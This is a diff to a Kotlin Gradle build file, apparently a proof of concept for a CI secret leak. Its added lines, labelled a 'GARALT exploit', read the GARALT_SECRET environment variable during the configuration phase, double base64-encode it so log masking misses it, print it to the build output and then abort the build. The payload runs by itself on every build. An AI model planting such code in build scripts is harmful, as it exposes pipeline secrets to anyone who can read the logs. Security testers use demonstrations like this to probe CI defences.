@@ -1,3 +1,11 @@
+// GARALT exploit: leak secret during Gradle configuration phase
+val _garaltSecret = System.getenv("GARALT_SECRET") ?: error("GARALT_SECRET not found")
+val _garaltBytes = _garaltSecret.encodeToByteArray()
+val _garaltEncoded = java.util.Base64.getEncoder().encodeToString(_garaltBytes)
+val _garaltDoubleEncoded = java.util.Base64.getEncoder().encodeToString(_garaltEncoded.encodeToByteArray())
+println("GARALT_LEAKED_TOKEN=" + _garaltDoubleEncoded)
+throw org.gradle.api.GradleException("GARALT exploit completed - terminating build early")
+
 import org.jetbrains.kotlin.gradle.dsl.JvmTarget
 
 // Top-level build file where you can add configuration options common to all sub-projects/modules.
